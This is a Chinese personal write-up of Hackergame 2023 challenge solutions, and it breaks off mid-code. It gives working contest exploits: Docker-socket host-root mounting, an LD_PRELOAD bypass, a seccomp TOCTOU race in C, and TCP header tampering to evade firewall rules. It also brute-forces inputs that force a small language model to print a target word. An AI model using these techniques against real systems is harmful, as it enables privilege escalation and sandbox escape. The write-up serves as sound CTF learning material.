# 前言

从2020年开始每年的hackergame都来参加，至今已经是第4年了。题目质量高、难度适中、个人赛，hackergame是难得的同时满足三个条件的比赛之一，每年参赛后的复盘也都会扩大知识面，值得参加，明年有空一定再来。    

只不过，作为一个社畜，7天期间能做题的时间实在有限（基本集中在开赛的周末，再加上后面几天晚上的零散时间），如果能延长到9天包含两个周末会好很多（当然，分数也会卷的更高吧）  

# 补hackergame2022题目

本应在去年写的，但一咕再咕……趁此机会补上（其实也就一道题）  

## 火眼金睛的小 E

[https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%81%AB%E7%9C%BC%E9%87%91%E7%9D%9B%E7%9A%84%E5%B0%8F%20E/README.md](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%81%AB%E7%9C%BC%E9%87%91%E7%9D%9B%E7%9A%84%E5%B0%8F%20E/README.md )

需要在同一份源码编译出的不同二进制文件中找出匹配的函数。此题level3（要求200组O0与O3的匹配不低于30%正确率）只有两解（如果没记错的话），我是其中之一（另一位是mcfx，无悬念）。  

出题人的[预期解](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%81%AB%E7%9C%BC%E9%87%91%E7%9D%9B%E7%9A%84%E5%B0%8F%20E/README.md )对前两关的预设是[BinDiff](https://www.zynamics.com/bindiff.html )（或者类似的[Diaphora](https://github.com/joxeankoret/diaphora )），而第三关是[SAFE](https://arxiv.org/pdf/1811.05296.pdf )或[jTrans](https://arxiv.org/pdf/2205.12713.pdf )等基于机器学习的方案。而[mcfx的解法](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/players/nbnbnb/README.md )提到，Diaphora和Bindiff正确率在只有15%-22%，而手做正确率能高达70%！  

二进制匹配问题实际有两类截然不同的应用场景。一类用于比较细微差异，常用于bugfix分析等场景；另一类用于语义匹配，常用于库函数识别等场景。前者需要对代码差异非常敏感，后者需要从高度变异的两段代码中找出共性，这是天然矛盾的两个目标。  
题目要求解决的显然是第二类场景，而很遗憾BinDiff和Diaphora主要针对第一类场景，这也解释了为什么它们在level3的表现极其糟糕。  


但是为什么手做正确率能那么高呢？  
想一想人是怎么手做level1的：开两个IDA，左右分屏，固定左边的函数，滚动右边的函数，如果两边看起来很像，就选定它了！至少，正常人应该不会盯着汇编看。  

O0与O3的二进制函数差异再大，终究是从同一份源代码编译而来的。  
从抽象的角度看，编译器只是做了一份从字节流到字节流的变换，但是要确保函数的语义在变换前后严格一致。而函数语义一致的表现，不严谨的简化一下，就是对于任何相同的输入，必须给出相同的输出。\[[_](https://github.com/hzqmwne/my-ctf-challenges/blob/master/0CTF_TCTF-2021-Finals/babalogin/writeup/writeup_en.md )\]  

函数语义是抽象的，需要把它具化下来才能实际进行比较。根据抽象层次从低到高，函数语义可以具化为：汇编语句、基本块、控制流、数据流、源代码、算法。  

控制流到数据流是其中的分水岭，很多编译优化都是基于数据流图进行的。也就是说，函数语义相同的函数的低层次抽象（汇编语句、基本块、控制流）可以千变万化，但高层次抽象（数据流、源代码、算法）往往十分接近。SAFE和jTrans在本题难以达到最佳效果，很可能是因为它们仍然基于汇编和控制流等低层次抽象构造训练集的原因。  

反编译器就是把低层次抽象语义转换为高层次抽象语义的最佳工具。（IDA F5 yyds！）  

所以，一个很朴素的思路产生了：利用IDA的F5把所有的函数都反编译为伪代码，然后对伪代码执行字符串相似度匹配，对给定的函数，在另一个文件中找到伪代码字符串最相似的函数作为答案提交。  

这种方法十分简单，而且可以完全自动化，并最终以接近70%的正确率轻松攻克level3。  

---

代码实现不难但有些杂乱，这里不贴了，不过一些细节要注意：  

1. 用IDA python script批量反编译一个程序中所有的函数，必须等待 `ida_auto.auto_wait()` 完成才能开始，否则反编译出来的伪代码效果巨差根本无法与GUI窗口的相比  
2. 很多函数无法被IDA识别出来，分析后发现主要是由于`.dynstr`与`.symtab`段被去除，导致函数结尾的`__stack_check_fail`和`_exit`等函数的`noreturn`属性无法被识别出来，而这两个函数在plt表，没有return，会导致相邻的函数被错误的合并为一些大函数  
3. 因此在反编译前需要先切分好所有的函数。注意到汇编窗口每个真实的函数(无论IDA是否识别出来)的开头都有 "`__unwind {`" 字样的注释，可以利用它作为一个特征识别函数边界。然后用del_func删除所有IDA自动识别的函数并用add_func重新添加自己切分的函数，重新auto_wait再反编译。  
4. 字符串相似度比较采用的是Levenshtein距离，这是最精确的字符串相似度比较，但跑起来并没有特别慢  

---

出题人说"binaryai 需要注册，并且已经停止服务了"，但事实上 [BinaryAI](https://www.binaryai.cn/ ) 已经重新开服且全新升级了。  

假如题目出在今年，或许可以试试 BinaryAI的 [双文件自定义比对](https://www.binaryai.cn/comparison )，网站上的样例文件 `openssl-1.1.1u-gcc_arm_O0-openssl.strip` vs 
`openssl-3.1.1-gcc_x64_O3-openssl.strip` 匹配效果十分出色（这两个文件的库版本、架构、优化选项都不同，比本题预设的场景难度更高。[链接1](https://www.binaryai.cn/compare/eyJzaGEyNTYiOiJiNDQzYjRjMmNiMzlkYWNmMTkwNzA3NTI1NGE3MWJkYTg1ZjU2OTczNDk3YjgxNmUyZWRjNTNlZGQ2OTE4MTllIiwidGFyZ2V0Ijp7ImJpbmRpZmYiOnsic2hhMjU2IjoiZTMwZWRjOGQ2YjYyN2U5YmRjMTRmNWQyMTViNzZiYTUxYzFjMTNhODZjOWNjYzEzYzY1YmEyNGIzZTdmODRiMCJ9fX0= )、 [链接2](https://www.binaryai.cn/interactive/compare/eyJzaGEyNTYiOiJiNDQzYjRjMmNiMzlkYWNmMTkwNzA3NTI1NGE3MWJkYTg1ZjU2OTczNDk3YjgxNmUyZWRjNTNlZGQ2OTE4MTllIiwidGFyZ2V0Ijp7ImJpbmRpZmYiOnsic2hhMjU2IjoiZTMwZWRjOGQ2YjYyN2U5YmRjMTRmNWQyMTViNzZiYTUxYzFjMTNhODZjOWNjYzEzYzY1YmEyNGIzZTdmODRiMCJ9fX0=?function=153564 )）。  

实测了几组当时保存的level2程序，BinaryAI平台给出的结果几乎100%正确，而且速度很快每组只要1分钟左右。  
对于level3，平台也会遇到函数切分的问题导致效果不佳，不过这个可以本地先处理下再上传（有点复杂，而且时隔一年，就不再试验效果了）。  

# hackergame2023题目

## Hackergame 启动

点提交，url结尾出现"?similarity="，等号后面填100   

## 猫咪小测

（今年的猫咪小测难度大降）  

1. 中国科学技术大学图书馆网站 https://lib.ustc.edu.cn/ 搜索 "A Classical Introduction To Modern Number Theory"（去掉后面的 2nd ed\.），在[西区外文书库](http://opac.lib.ustc.edu.cn/opac/item.php?marc_no=36356f4861302f4734367732314e64394f6a797a654f46444d53506633476761725267413365764f752b513d )  
回到首页找[馆藏分布](https://lib.ustc.edu.cn/%e6%9c%ac%e9%a6%86%e6%a6%82%e5%86%b5/%e9%a6%86%e8%97%8f%e5%88%86%e5%b8%83/ )，西区12楼是外文书库
2. 百度搜索"可观测宇宙中的鸡的密度上限"（这次比某不存在的搜索引擎效果好），找到一篇知乎问题[你见过哪些极品论文](https://www.zhihu.com/question/20337132/answer/3023506910?utm_source=zhihu )，第一个回答给出答案是23，原始论文在[arxiv](https://arxiv.org/abs/2303.17626 )  
3. 搜索linux kernel tcp bbr config等相关内容，答案是 CONFIG_TCP_CONG_BBR  
4. 搜索"mypy dead loop"，很靠前的结果就是[Python Type Hints Are Turing Complete](https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf)，会议为ECOOP。  
   关于mypy，个人认为这才是真正能提升python代码质量的工具（flake8、pylint、black、isort之类的工具并不能治本），自己目前写的所有python项目都一直开启\-\-strict选项（把python当静态语言写\(快进到tython\)）（也一直想在公共仓库CI流水线推广开启`mypy --strict`\(这样至少见不到一个list存几种不同类型数据、多层嵌套列表\[0\]\[1\]\[0\]\)之类可读性地狱的代码了\)\(不过，推广并不成功…\)）（你说本篇writeup的python代码都没做类型标注？一次性的脚本当然没必要向长期维护的项目那么严谨）  
   不过从本题第一次知道python的type hint是图灵完备的，或许可以想想如何出成一道逆向题（x）  

## 更深更暗

flag是js动态生成的，直接查看源代码不行，但F12看DOM可以  

## 旅行照片 3.0

与猫咪小测相反，今年的旅行照片究极折磨  

1. 照片的带子上有statphys28，查到此会议日程在2023-08-07到2023-08-11之间，爆破一下得到2023-08-10。  
2. 奖牌是诺贝尔奖，奖品上的姓名Masatoshi Koshiba是物理学奖。但，题目说的“同种奖牌”，究竟特指诺贝尔物理学奖，还是诺贝尔物理学和化学奖（这两种奖牌样式相同），还是所有诺贝尔奖，着实纠结许久。起初着重于找获得诺贝尔奖的日本人，许久无果，转换思路找东京大学的wiki，在杰出校友栏中找到一个获奖者Takaaki Kajita，获奖时的研究所是ICRR。  
3. 不太记得怎么搜到的日本梅酒节（关键词大概围绕上野公园、大喷泉、2023年8月等），在活动网站 https://umeshu-matsuri.jp/tokyo_staff/ 有问卷编号 S495584522。
4. 从地图上看位置，大概是国立科学博物馆，网站https://www.kahaku.go.jp/english/userguide/access/index.html 提到了¥630、Free等几个值；确定第3题正确的情况下直接从0爆破，结果一下就对了？？  
5. 已知日期是2023-08-10，找statphys28的timetable：https://statphys28.org/programtt.html，当晚是banquet（宴会）；继续搜索statphys28 Banqiet，找到安排：https://statphys28.org/banquet.html ，集合地点是安田讲堂。  
6. 题目描述迷惑性很强……ボタン＆カフリンクス是button&cufflinks，而以button&cufflinks为关键字搜到的重点是8月与史努比的联动活动……完全跑偏了。重点在于带上双引号"ボタン＆カフリンクス"，在 https://www.instagram.com/explore/tags/%E3%83%9C%E3%82%BF%E3%83%B3%E3%82%A2%E3%83%B3%E3%83%89%E3%82%AB%E3%83%95%E3%83%AA%E3%83%B3%E3%82%AF%E3%82%B9/?ref=9472 看到了粉色海报，图案是熊猫。后半题，先说了上野站中央检票口，紧接着说出站处，这第一反应肯定是上野站的出站处吧……然后就跳入了无尽的坑；直到很久之后，搜索“上野  广告牌 每小时 3d动物”，在一段视频 https://www.youtube.com/watch?v=-Onv_zT3TFk 中才发现地点在澀谷，动物是秋田犬。  

（总之，是一道付出和收益完全完全不成比例的题）  

## 赛博井字棋

F12 network观察请求，猜测后端没有检查点的格子是否为空；把js里标记格子是否点过的变量设为0（具体哪个忘了），然后点击对手的格子，即可轻松获胜。  

## 奶奶的睡前 flag 故事

Google亲儿子手机是pixel，搜索“pixel screenshot cve”，发现是CVE-2023-21036的ACropalypse。先找了第一个工具 https://github.com/frankthetank-music/Acropalypse-Multi-Tool ，始终解决不了它的图形界面库依赖；换成 https://gist.github.com/DavidBuchanan314/93de9d07f7fab494bcdf17c2bd6cef02 ，直接能跑出后半张图片，flag清晰可见。  

## 组委会模拟器

忽略前端的花里胡哨，F12看请求，所有消息是一次性获得的，里面包含了时间。本地循环按时发送deleteMessage请求即可。  

```python
import json
import re
import time
import requests

headers = {"Cookie": "session=<>"}

r = requests.get("http://202.38.93.111:10021/api/checkToken", headers=headers)
#print(r.text)

r = requests.post("http://202.38.93.111:10021/api/getMessages", headers=headers)
start_time = time.time()
#print(r.text)
messages = json.loads(r.text)["messages"]


for i, message in enumerate(messages):
    print(i, message)
    delay = message["delay"]
    text = message["text"]
    current_time = time.time()
    while current_time - start_time < delay:
        time.sleep(0.5)
        current_time = time.time()
    if re.search(r"hack\[[a-z]+\]", text):
        r = requests.post("http://202.38.93.111:10021/api/deleteMessage", json={"id": i}, headers=headers)
        print(r.text)

r = requests.post("http://202.38.93.111:10021/api/getflag", headers=headers)
print(r.text)
```

## 虫

一眼SSTV，往届hackergame考烂了的东西  

找个工具：https://github.com/colaclanth/sstv  
`python -m sstv -d insect.wav -o result.png`

得到效果完美的原始图片  

## JSON ⊂ YAML?

有点波折  
YAML 1.1用了 https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files 的 12345e999  
YAML 1.2卡了很长时间，一直陷入yaml规范 https://yaml.org/spec/1.2.2/ext/changes/ 提到的json是yaml1.2的严格子集；直到发现了 https://lobste.rs/s/equcp2/json_is_not_yaml_subset ，提到key重复的问题；回看 https://yaml.org/spec/1.2.1/#id2759572 ，提到json建议但不强制key唯一，而yaml1.2是强制的，所以 {"a":1,"a":1} 是一个答案。  

## Git? Git!

git reflog，基础常识  

## HTTP 集邮册

无状态码：很早以前就知道http/0.9，所以这一问无压力。(`GET /`，不要跟版本号，则服务器会按照http/0.9处理，响应不包含头直接就是内容)  
至于如何知道的，是因为懵懂时期曾尝试用curl访问nc的端口（唔）：（202.38.93.111:10096是上面JSON ⊂ YAML?题目的地址）  
```shell
$ curl http://202.38.93.111:10096
curl: (1) Received HTTP/0.9 when not allowed
```

---

12个状态码，对着MDN文档 https://developer.mozilla.org/en-US/docs/Web/HTTP/Status 逐个看：（官方交流群里对找第13个状态码很积极，不过相同的时间和精力我选择做后面的math题）  
```
100：

GET / HTTP/1.1\r\n
Host: example.com\r\n
Expect: 100-continue\r\n
\r\n

 

200：

GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n


206：

GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=0-1\r\n
\r\n



304：

GET / HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: "64dbafc8-267"\r\n
\r\n


400：

GET / HTTP/1.1\r\n
Hos: example.com\r\n\r\n


404：

GET /a HTTP/1.1\r\n
Host: example.com\r\n\r\n


405：

PUT /a HTTP/1.1\r\n
Host: example.com\r\n\r\n


412:

（这是前5个收集到的状态码之一）

HEAD /index.html HTTP/1.1\r\n
If-Match: 64dbafc8-267\r\n
Host: example.com\r\n\r\n

HTTP/1.1 412 Precondition Failed
Server: nginx/1.25.2
Date: Sat, 28 Oct 2023 10:35:28 GMT
Content-Type: text/html
Content-Length: 173
Connection: keep-alive


413：
（卡11个相当长时间，直到很久才收集到了它）
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect

GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 10000000000\r\n
\r\n


414：

GET /aa<...这里省去一些篇幅，反正够长就行...>aa HTTP/1.1\r\n
Host: example.com\r\n
\r\n


416：

GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1000000-1000\r\n
\r\n


505：

GET / HTTP/2\r\n
Host: example.com\r\n
\r\n
```

## Docker for Everyone

能够与非rootless的docker daemon交互等同于获得了root权限。  

先把根目录映射进容器看看：  
```shell
docker run --rm -v /:/mnt -it alpine
```
发现/flag（容器内是/mnt/flag）是指向/dev/shm/mnt的符号链接，而/dev/shm在docker内部会被重新挂载覆盖  

那就把主机的/dev/shm映射到docker内部：  
```shell
docker run --rm -v /dev/shm:/mnt -it alpine
```
cat /mnt/flag 得到 flag

## 惜字如金 2.0

cod_dict共5行，每行缺了一个字符；先尝试在首尾补全，运行看效果，再手调几次，直到输出的flag看的最顺眼。  

自己在开赛前期确实一道math都没有思路（这题不算），一度丧失信心，后期才慢慢……

## 🪐 高频率星球

`asciinema play asciinema_restore.rec > restore_dump.bin` asciinema play 重放的同时dump到文件（现在看来其实用asciinema cat更好）  

vim打开，可以看到反复出现的翻页控制字符：
```
...
    "iMpdOxr4",
:^[[K^M^[[K ^[[KESC^H^H^HESC^[[K[^H[^[[K6^H6^[[K~^H~^M^[[K    "WONdOSodWPKv",
    "kSkjp8kZEq",
...
    "h19qnmkJ",
:^[[K^M^[[K ^[[KESC^H^H^HESC^[[K[^H[^[[K6^H6^[[K~^H~^M^[[K    "Ax95W6Pl",
    "WRytCMXh",
...
```

把这些控制字符批量替换为空，顺便把"\r\n"也还原成"\n"（"\r\n"是终端的换行）  
```python
with open("restore_dump.bin", "rb") as f:
    s = f.read()

'''
000009b0: 0d0a 2020 2020 226b 386b 5277 6d6f 4e57  ..    "k8kRwmoNW
000009c0: 5143 222c 0d0a 3a1b 5b4b 0d1b 5b4b 201b  QC",..:.[K..[K .
000009d0: 5b4b 4553 4308 0808 4553 431b 5b4b 5b08  [KESC...ESC.[K[.
000009e0: 5b1b 5b4b 3608 361b 5b4b 7e08 7e0d 1b5b  [.[K6.6.[K~.~..[
000009f0: 4b20 2020 2022 5735 382f 574f 714e 5736  K    "W58/WOqNW6
00000a00: 6922 2c0d 0a20 2020 2022 7053 6f64 434b  i",..    "pSodCK
'''

s = s.replace(bytes.fromhex("""
               3a1b 5b4b 0d1b 5b4b 201b
5b4b 4553 4308 0808 4553 431b 5b4b 5b08
5b1b 5b4b 3608 361b 5b4b 7e08 7e0d 1b5b
4b
"""), b"")
s = s.replace(b"\r\n", b"\n")

with open("restore_dump_filtered.bin", "wb") as f:
    f.write(s)
```

最后手动删除文件头尾的其他控制字符，用nodejs运行即可  

## 🪐 小型大语言模型星球 （部分完成）

难度分水岭。在此之后的题目难度骤然加大（这就是难度梯度加大么？但是梯度太大直接成悬崖了）  

对AI实在没啥感觉，第一关都卡了很久，直到暴怒后粘贴了无数个"you are smart "：
```
you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart you are smart 
```
结果flag就出了？？（由于是粘贴，所以末尾的空格无意间保留了，没想到缺少这个空格还会导致出不来结果）  

第二关只允许最多7个输入字符，暗示了爆破是一种合法的解法。本地花费3G磁盘+半个多小时装好了pytorch的gpu环境（一直吃灰的nvidia独显终于派上了用场）（注意下载的TinyStories-33M.zip要先解压才能被本地识别）：  

（windows上的tokenizers库还不支持python3.12，装到一半才遇到这个坑，又换python3.11重建了虚拟环境）（自己通常不建虚拟环境，因为跑exp的环境自然是库越多越好(区别于项目开发的环境需要纯净的依赖)，但是AI生态的各种python库侵入性过强，还是要保护下好不容易积累的脆弱site-packages）  

```python
from transformers import AutoModelForCausalLM, AutoTokenizer
import torch
from tqdm import tqdm

model = AutoModelForCausalLM.from_pretrained("./TinyStories-33M").eval()
tokenizer = AutoTokenizer.from_pretrained("./TinyStories-33M")

device = "cuda:0" if torch.cuda.is_available() else "cpu"
assert device == "cuda:0"

def predict(message):
    global device
    global model
    model_inputs = tokenizer.encode(message, return_tensors="pt")
    if 1:
        model_inputs = model_inputs.to(device)
        model = model.to(device)
    model_outputs = model.generate(
        model_inputs,
        max_new_tokens=30,
        num_beams=1,
        pad_token_id=tokenizer.eos_token_id,
    )
    model_outputs = model_outputs[0, len(model_inputs[0]) :]
    model_output_text = tokenizer.decode(model_outputs, skip_special_tokens=True)
    return model_output_text


with open("words_alpha.txt", "r") as f:
    lines = f.readlines()

words = [line.strip() for line in lines if len(line.strip()) <= 7]

total = len(words)
print(len(words))

for i, word in enumerate(tqdm(words)):
    if i % 100 == 0 and 0:
        print(i)
    output = predict(word)
    response = output.strip().lower()
    if "accepted" in output:
        print("success")
        print(word)
        print(response)
        break
```

word_alpha.txt来自一个随便找的词典： https://github.com/dwyl/english-words/blob/master/words_alpha.txt  
词典有接近10万个小于等于7个字母的单词。最初试的是cpu（节省点磁盘空间，cpu版本的pytorch小多了），速率大概1秒跑1个单词，换了gpu达到1秒跑6个单词，预估时间3.5个小时，实际跑了40分钟就找到了第一个答案：chiasmi  （这个单词怎么看都与accepted无关，但它确实能诱导成功）  

后两关超出自己的能力范围了。显然题目期望的输出是不会出现在模型的训练语料中的，曾猜测可能是要构造某种具备上下文关联结构的prompt让模型学会重复输入（赛后看题解这个猜测完全错了）。  

## 🪐 流式星球

题目直接把每个视频帧组成连续的图片流再转换为字节流，这期间丢失了宽度、高度、帧数三个重要信息。  

第一反应是因式分解一下，但是给的字节流末尾随机切了一块，此方法不再成立。  

那么不如暴力，猜测正常视频的宽度在100到1000之间，生成900张图片人工去看，很容易发现宽度为427的图片是正常的，所以宽度就是427；再从相邻两帧的图片识别出高度为759。  

接下来绕了弯路想还原为视频再抽帧，后来反应过来为什么不直接输出图片呢：  

```python
import cv2
import numpy as np

buffer = np.fromfile("video.bin", dtype=np.uint8)
print(len(buffer))    # 135146688 = 2**6 * 3 * 409 * 1721

'''
buffer = buffer.reshape((45048896, 3))
print(buffer)
for i in range(10):
    print(buffer[i])

for i in range(100, 1000):
    cv2.imwrite(f"tmpimgs/tmpimg{i}.png", buffer[:1000*i].reshape(1000,i,3))
'''

# 759*427
# 135146781 = 139 * 759*427 * 3

# cv2.imwrite(f"tmpimgs/tmpimg{i}.png", buffer[:1000*i].reshape(1000,i,3))

buffer = np.pad(buffer, (0, 135146781-135146688), 'constant')
buffer = buffer.reshape((139, 759, 427, 3))

for i in range(139):
    cv2.imwrite(f"tmpimgs/tmpimg{i}.png", buffer[i])

'''
# https://stackoverflow.com/questions/67253596/converting-numpy-array-to-videoframe
fps = 2
out = cv2.VideoWriter('video.mp4', cv2.VideoWriter_fourcc(*'mp4v'), fps, (427, 759))
for i in range(139):
    data = buffer[i, :, :, :]
    out.write(data)
'''
```

## 🪐 低带宽星球 （部分完成）

确实中间加一问体验会更好一点  

纯色压缩，位图肯定比不上矢量图。手写svg以不到300个字节通过了第一关，然后第二关被彻底卡住（最好情况用svgz达到了106字节）  

找到了一个有趣的格式 iconvg https://github.com/google/iconvg/tree/main ，看起来应该能达到50字节的目标，但很遗憾libvips并不支持  
找libvips支持的格式 https://github.com/libvips/libvips/blob/df8b8e247ed410138fcacec2f43f0c5c16aecc37/libvips/foreign/foreign.c#L654 ，jpeg-xl就在其中但第一时间就忽略了（思路一直局限在二进制格式的矢量图；看到wiki说它是位图就直接放了，而且jpeg-xl的前缀也造成了刻板印象以为跟jpeg文件一样会很大。。。没想到这就是题目答案）  

## Komm, süsser Flagge （部分完成）

第一关只要让POST拆分到两个TCP包中即可绕过检查：

```python
from pwn import *

token = "<>"

payload1 = f"""POST / HTTP/1.1\r\nHost: 202.38.93.111\r\nContent-Length: {len(token)}\r\n\r\n{token}"""

def solve1():
    s = remote("202.38.93.111", 18080)
    s.send(payload1[:3])
    sleep(3)
    s.send(payload1[3:])
    s.interactive()

solve1()
```


然后，第二关硬是卡了相当长时间（做题太规矩了，竟然没想到直接试试用第一关的exp打第二关……）  

找到一篇文档 http://www.stearns.org/doc/archives/iptables-u32.v0.1.4.html 猜到了要利用reserved（p.s.这个词总是打成reversed）bit搞事情，但苦于不知道如何改包头。  
第一轮试验，找各种用rawsocket实现的tcp协议栈，但大部分都跑不起来，不知道原因  
第二轮试验，得知了python的scapy库能构造各种包并发送，但是无论怎么搞，发了syn包就会卡在sr1函数调用上，折腾不明白  

后来，得知了nfqueue，可以实时劫持数据包，借此做出了第二题：  

准备工作：网络环境有点复杂（至少两层路由器的nat+虚拟机的nat），保守起见直接连入给的openvpn，然后iptables配置数据包转发到nfqueue  
```shell
sudo openvpn hg-guest.ovpn
sudo iptables -A OUTPUT -o hgovpn-guest -p tcp -j NFQUEUE --queue-num 1
```
用scapy拦截所有queue中的数据包，设置tcp包头的reserved字段为1绕开检查（代码基于chatgpt生成再人工修改）：  
```python
from scapy.all import *
from netfilterqueue import NetfilterQueue as nfq

def packet_callback(packet):
    pkt = IP(packet.get_payload())
    print(pkt.show())

    pkt[IP].ttl = 64

    pkt[TCP].reserved = 15
    del pkt[IP].chksum
    del pkt[TCP].chksum

    print(pkt.show())

    packet.set_payload(bytes(pkt))
    packet.accept()

def main():
    q = nfq()
    q.bind(1, packet_callback)

    try:
        q.run()
    finally:
        q.unbind()

if __name__ == "__main__":
    main()
```
保持脚本运行，正常访问第二关的地址得到第二关flag：
```shell
curl -X POST -d "<token>" http://192.168.23.1:18081
```

第三关，大概看出来是要对每个数据包都加入"GET / HTTP"字符串，而且syn之类的握手包也不能例外。这里错误的理解了--from 0 --to 50以为是tcp payload的部分（结果是从IP包头开始的），在各种尝试用scapy构造数据包、修seq；然而始终都没有用scapy正常发出过一个正常的http请求并收到响应，最终放弃。  

## 为什么要打开 /flag 😡

曾记得前几届hackergame的群里出现过一句名言：排行榜是动态的，一血榜是永久的。  
所以，想榜上留名，最好的方法是开赛大部分人都在抢签到题时选一个冷门分类啃下来一道一血。  
（事实证明这个策略很有效，今年的总排行榜卷到爆炸。。。）  

第一关LD_PRELOAD，动态链接器ld.so会用这个环境变量，所以只要静态链接即可绕过：  
```c
#include <unistd.h>
#include <fcntl.h>

int main(void) {
        char buf[4096];
        int fd = open("/flag", 0);
        int r = read(fd, buf, 4096);
        write(1, buf, r);
        close(fd);
        return 0;
}
```
```shell
gcc -static level1.c -o level1
```

第二关seccomp限制了系统调用，但opening_handler里的continue_syscall一眼看上去就有TOCTOU的危险；查了下seccomp_unotify的man page以及rust的这个库，都给出了同样的警告。所以解法已经出来了，用多线程/多进程不断改变参数的内存，期望在检查时通过然后在实际执行时换回flag的路径。  

但是，总感觉解法出来的太容易了怀疑有暗坑，为了求一手稳，想着先在本地测试一下，于是后台docker pull着（因为apt-get直接装的rust在编译时出错，自己又不懂rust不会修；另：rust的安全设计理念确实很好(C/C++代码要想写的完备往往也会有意无意的遵循rust编译器强制执行的约束)，但个人不太喜欢它的语法；而且，做逆向时真的不想遇到rust编译出的二进制程序），转头去做*逆向工程不需要F5*。结果网速爆炸硬是两个小时没拉下来镜像，直到傍晚发现第二关一血出了……果断认定思路成立，不再纠结本地测试，直接硬写：  
```c
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>

void store(char *s, int offset, int value) {
        s[offset] = value;
}

int main(void) {
        // alarm(1);
        char buf[4096];
        volatile char *name = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
        name[0] = '/';
        name[1] = 'f';
        name[2] = '1';
        name[3] = 'a';
        name[4] = 'g';
        name[5] = '\0';
        pid_t pid = fork();
        if (pid == 0) {
                for (int i = 0; i < 0x1000000; i++) {
                        ;
                }
                int fd = open(name, 0);
                int r = read(fd, buf, 4096);
                write(1, buf, r);
                close(fd);
        }
        else if (pid > 0) {
                for (int i = 0; i < 0x10000000; i++) {
                        store(name, 2, 'l');
                        store(name, 2, '1');
                }
        }
        return 0;
}
```
最开始写了一个pthread_create的多线程版本，但传上去不成功；不想纠结，改用mmap共享内存+fork多进程，即上面的版本（虽然最后看来问题不在此）。  
踩了两个坑：1.改变open参数指向的内存的循环代码，必须在open函数调用之前就启动，并在open执行之后再返回，为此加了两个大循环做微同步；2.内存赋值的代码抽了一个store函数出来，似乎直接写两个连着的赋值会被编译器优化掉其中一个。  

## 异星歧途

体验很糟糕的一道题，源于除了旧日之痕的另外三道binary都A掉后这题仍然不会做，甚至根本没搞懂按钮点击后的逻辑定义在什么地方（一头扎进地图编辑器中，只能做到放方块，却找不到按钮逻辑如何定义），那种有力没处使的感觉非常不爽。  

容易搜到的文档都默认省略了这个关于游戏操作的过于基础的问题（但对于一个初次上手此游戏的人，基础的操作往往才是大问题）。  

直到第三天，这题的做出人数已经非常多了，没办法只能继续搜教程学玩法。（但是我只想逆按钮逻辑，对游戏本身毫无兴趣……体验感持续\-\-）    

最后终于找到了这篇：https://www.9game.cn/news/5021459.html ，里面的“给处理器添加指令”部分提到了基础操作：在游戏中找到代表处理器的方块，点击它，再点击下面的编辑按钮，就能看到逻辑了。  

前两组逻辑很容易逆推；第四组在地图上乱试发现与非门等结构，但试着试着就过了；第三组花费时间有点长（但其实1/256已经可以考虑连接服务器爆破了），不过大概发现冷却液要先于钍反应堆产生；多次试验后第2和第7个按钮的功能仍然没搞清楚（想搞清楚又要学习一大堆题目之外毫无兴趣的游戏本身的机制……），四种情况连接服务器手动爆破。    

## 微积分计算小练习 2.0 （未完成）

geekgame的xss在二阶段放出提示后仍然没做出来，而这题也是xss，直接放弃（另一个原因，比赛后半程自己的业余时间基本在磕math和摆烂之间反复横跳）  

## 逆向工程不需要 F5

IDA F5 yyds！至于不能F5的逆向……那肯定是换题做能F5的逆向    

这题把函数中间的逻辑拆分到多个dll中，导致主函数F5看到的逻辑并不完整。既然题目直接F5不太行，那就修理它直到能F5为止!  

好在dll数量不算太多，第一步先把dll里的代码填回到主程序中。另外，逆向工程不需要调试器(x)，所以随便在\.text段找一个地址填充（0x2000(对应文件偏移0x1400)看起来不错，是个整数），反正绝对不会去运行主程序的(x)（这题逻辑不长，如果能把F5修到源码级别，动调都是浮云）。  

```python
with open("main.exe", "rb") as f:
    allcontent = f.read()

def do_patch(s, offset, buf):
    s[offset:offset+len(buf)] = buf

def do_port(s, offset, dllfile, dlloffset, length):
    with open(dllfile, "rb") as f:
        tmp = f.read()
    buf = tmp[dlloffset:dlloffset+length]
    do_patch(s, offset, buf)

s = bytearray(allcontent)

do_port(s, 0x1400, "libs00.dll", 0x400, 0x1c)    # 1d4e
do_port(s, 0x1420, "libs01.dll", 0x400, 0x23)    # ac57
do_port(s, 0x1450, "libs02.dll", 0x400, 0x14)    # 1a01
do_port(s, 0x1470, "libs03.dll", 0x400, 0x21)    # 961a
do_port(s, 0x14a0, "libs04.dll", 0x400, 0x12)    # 9acf
do_port(s, 0x14c0, "libs05.dll", 0x400, 0x22)    # 6c6b
do_port(s, 0x14f0, "libs06.dll", 0x400, 0x1c)    # 63f7
do_port(s, 0x1510, "libs07.dll", 0x400, 0x34)    # 4fe5
do_port(s, 0x1550, "libs08.dll", 0x400, 0x13)    # c158
do_port(s, 0x1570, "libs09.dll", 0x400, 0xe)    # f6ec
do_port(s, 0x1580, "libs10.dll", 0x400, 0xc)    # 03a9
do_port(s, 0x1590, "libs11.dll", 0x400, 0x7)    # 62a2
do_port(s, 0x15a0, "libs12.dll", 0x400, 0x7)    # 1ec4
do_port(s, 0x15b0, "libs13.dll", 0x400, 0x7)    # dc78
# do_port(s, 0x15c0, "libs14.dll", 0x400, )    # c55f
# do_port(s, 0x1500, "libs14.dll", 0x400, )    # 0d12

with open("main_patched1.exe", "wb") as f:
    f.write(s)
```

接下来，在IDA里用keypatch手动patch各处外部调用，将其patch为对填充代码的调用（漫长的周六下午）：  
```c
bool __usercall __spoils<rax> sub_140001440@<sil>(char *a1@<rax>)
{
